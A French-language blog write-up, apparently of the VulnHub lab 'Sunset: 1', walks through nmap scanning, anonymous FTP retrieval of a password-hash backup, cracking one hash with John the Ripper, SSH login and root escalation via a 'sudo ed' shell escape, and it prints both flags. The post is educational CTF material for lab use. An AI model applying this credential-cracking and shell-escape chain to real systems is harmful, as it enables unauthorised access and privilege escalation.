{"hash":"b89929ffb278454bd1f8bb0277abaa50df9b43f7","data":{"post":{"title":"CTF Sunset: 1","date":"29 April 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.1</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.63</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir Sunset1 &amp;&amp; cd Sunset1</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -A -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nNmap scan report <span class=\"token keyword\">for</span> sunset.home <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.1.63<span class=\"token punctuation\">)</span>\nHost is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00053s latency<span class=\"token punctuation\">)</span>.\nNot shown: <span class=\"token number\">65533</span> closed ports\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">21</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ftp</span>     pyftpdlib <span class=\"token number\">1.5</span>.5\n<span class=\"token operator\">|</span> ftp-anon: Anonymous FTP login allowed <span class=\"token punctuation\">(</span>FTP code <span class=\"token number\">230</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_-rw-r--r--   <span class=\"token number\">1</span> root     root         <span class=\"token number\">1062</span> Jul <span class=\"token number\">29</span>  <span class=\"token number\">2019</span> backup\n<span class=\"token operator\">|</span> ftp-syst:\n<span class=\"token operator\">|</span>   STAT:\n<span class=\"token operator\">|</span> FTP server status:\n<span class=\"token operator\">|</span>  Connected to: <span class=\"token number\">192.168</span>.1.63:21\n<span class=\"token operator\">|</span>  Waiting <span class=\"token keyword\">for</span> username.\n<span class=\"token operator\">|</span>  TYPE: ASCII<span class=\"token punctuation\">;</span> STRUcture: File<span class=\"token punctuation\">;</span> MODE: Stream\n<span class=\"token operator\">|</span>  Data connection closed.\n<span class=\"token operator\">|</span>_End of status.\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">7</span>.9p1 Debian <span class=\"token number\">10</span> <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey:\n<span class=\"token operator\">|</span>   <span class=\"token number\">2048</span> <span class=\"token number\">71</span>:bd:fa:c5:8c:88:7c:22:14:c4:20:03:32:36:05:d6 <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> <span class=\"token number\">35</span>:92:8e:16:43:0c:39:88:8e:83:0d:e2:2c:a4:65:91 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> <span class=\"token number\">45</span>:c5:40:14:49:cf:80:3c:41:4f:bb:22:6c:80:1e:fe <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span>\nService Info: OS: Linux<span class=\"token punctuation\">;</span> CPE: cpe:/o:linux:linux_kernel</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un serveur <strong>FTP</strong> sur le port <strong>21</strong> et un serveur <strong>SSH</strong> sur le port <strong>22</strong>. On commence donc par énumérer le serveur <strong>FTP</strong> en tant qu'utilisateur anonyme.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ftp</span>\n<span class=\"token function\">open</span> <span class=\"token number\">192.168</span>.1.63\nConnected to <span class=\"token number\">192.168</span>.1.63.\n<span class=\"token number\">220</span> pyftpdlib <span class=\"token number\">1.5</span>.5 ready.\nName <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.1.63:kali<span class=\"token punctuation\">)</span>: anonymous\n<span class=\"token number\">331</span> Username ok, send password.\nPassword:\n<span class=\"token number\">230</span> Login successful.\nftp<span class=\"token operator\">></span> <span class=\"token function\">ls</span> -la\n<span class=\"token number\">200</span> Active data connection established.\n<span class=\"token number\">125</span> Data connection already open. Transfer starting.\n-rw-r--r--   <span class=\"token number\">1</span> root     root         <span class=\"token number\">1062</span> Jul <span class=\"token number\">29</span>  <span class=\"token number\">2019</span> backup</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Un fichier nommé \"backup\" est disponible.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">ftp<span class=\"token operator\">></span> get backup\nlocal: backup remote: backup\n<span class=\"token number\">200</span> Active data connection established.\n<span class=\"token number\">125</span> Data connection already open. Transfer starting.\n<span class=\"token number\">226</span> Transfer complete.\n<span class=\"token number\">1062</span> bytes received <span class=\"token keyword\">in</span> <span class=\"token number\">0.00</span> secs <span class=\"token punctuation\">(</span><span class=\"token number\">668.2406</span> kB/s<span class=\"token punctuation\">)</span>\nftp<span class=\"token operator\">></span> <span class=\"token builtin class-name\">exit</span>\n<span class=\"token number\">221</span> Goodbye.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Regardons ce que contient le fichier \"backup\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> backup\nCREDENTIALS:\noffice:<span class=\"token variable\">$6</span><span class=\"token variable\">$$</span>9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.\ndatacenter:<span class=\"token variable\">$6</span><span class=\"token variable\">$$</span>3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/\nsky:<span class=\"token variable\">$6</span><span class=\"token variable\">$$</span>Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0\nsunset:<span class=\"token variable\">$6</span><span class=\"token variable\">$406THujdibTNu</span>./R<span class=\"token variable\">$NzquK0QRsbAUUSrHcpR2QrrlU3fA</span>/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/\nspace:<span class=\"token variable\">$6</span><span class=\"token variable\">$$</span>4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Cela ressemble fortement à du <strong>SHA-512</strong>... Dans un nouveau fichier texte, on isole le compte de \"sunset\" (étant donné que c'est le nom du CTF) <code class=\"language-text\">echo &#39;sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/&#39; &gt;&gt; sunset.txt</code> (bien mettre des simples quotes et non des doubles quotes) afin de lancer <strong>John the Ripper</strong> pour le déchiffrer.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ john sunset.txt\nUsing default input encoding: UTF-8\nLoaded <span class=\"token number\">1</span> password <span class=\"token builtin class-name\">hash</span> <span class=\"token punctuation\">(</span>sha512crypt, crypt<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$6</span>$ <span class=\"token punctuation\">[</span>SHA512 <span class=\"token number\">128</span>/128 SSE2 2x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nCost <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>iteration count<span class=\"token punctuation\">)</span> is <span class=\"token number\">5000</span> <span class=\"token keyword\">for</span> all loaded hashes\nWill run <span class=\"token number\">2</span> OpenMP threads\nProceeding with single, rules:Single\nPress <span class=\"token string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"token keyword\">for</span> status\nWarning: Only <span class=\"token number\">3</span> candidates buffered <span class=\"token keyword\">for</span> the current salt, minimum <span class=\"token number\">8</span> needed <span class=\"token keyword\">for</span> performance.\nWarning: Only <span class=\"token number\">7</span> candidates buffered <span class=\"token keyword\">for</span> the current salt, minimum <span class=\"token number\">8</span> needed <span class=\"token keyword\">for</span> performance.\nWarning: Only <span class=\"token number\">3</span> candidates buffered <span class=\"token keyword\">for</span> the current salt, minimum <span class=\"token number\">8</span> needed <span class=\"token keyword\">for</span> performance.\nWarning: Only <span class=\"token number\">4</span> candidates buffered <span class=\"token keyword\">for</span> the current salt, minimum <span class=\"token number\">8</span> needed <span class=\"token keyword\">for</span> performance.\nWarning: Only <span class=\"token number\">5</span> candidates buffered <span class=\"token keyword\">for</span> the current salt, minimum <span class=\"token number\">8</span> needed <span class=\"token keyword\">for</span> performance.\nWarning: Only <span class=\"token number\">4</span> candidates buffered <span class=\"token keyword\">for</span> the current salt, minimum <span class=\"token number\">8</span> needed <span class=\"token keyword\">for</span> performance.\nWarning: Only <span class=\"token number\">6</span> candidates buffered <span class=\"token keyword\">for</span> the current salt, minimum <span class=\"token number\">8</span> needed <span class=\"token keyword\">for</span> performance.\nWarning: Only <span class=\"token number\">7</span> candidates buffered <span class=\"token keyword\">for</span> the current salt, minimum <span class=\"token number\">8</span> needed <span class=\"token keyword\">for</span> performance.\nAlmost done: Processing the remaining buffered candidate passwords, <span class=\"token keyword\">if</span> any.\nProceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist\n0g <span class=\"token number\">0</span>:00:00:52 <span class=\"token number\">46,72</span>% <span class=\"token number\">2</span>/3 <span class=\"token punctuation\">(</span>ETA: <span class=\"token number\">16</span>:58:06<span class=\"token punctuation\">)</span> 0g/s 1370p/s 1370c/s 1370C/s srediaR<span class=\"token punctuation\">..</span>aeerdnA\nProceeding with incremental:ASCII\ncheer14          <span class=\"token punctuation\">(</span>sunset<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Après quelques minutes, <strong>John</strong> nous trouve le mot de passe \"cheer14\".</p>\n<h2>Pénétration</h2>\n<p>Maintenant que nous avons le mot de passe de l'utilisateur \"sunset\", on peut pénétrer sur le serveur via <strong>SSH</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> sunset@<span class=\"token variable\">$IP</span>\nsunset@192.168.1.63's password: cheer14</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Dans le répertoire de cet utilisateur, on trouve le flag user.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> user.txt\n5b5b8e9b01ef27a1cc0a2d5fa87d7190</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>Regardons les privilèges de cet utilsateur.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> -l\n<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/ed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Sur <a href=\"https://gtfobins.github.io/gtfobins/ed/#sudo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GTFOBins</a>, on regarde quelle commande permet d'utiliser la commande \"ed\" en tant que \"sudo\" dans le terminal.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> ed\n$ <span class=\"token operator\">!</span>/bin/sh\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Désormais \"root\", dans le répertoire de ce dernier, on trouve le flag final.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /root/flag.txt\n25d7ce0ee3cbf71efbac61f85d0c14fe</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/sunset-1,339","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":5,"parts":[]}},"context":{}}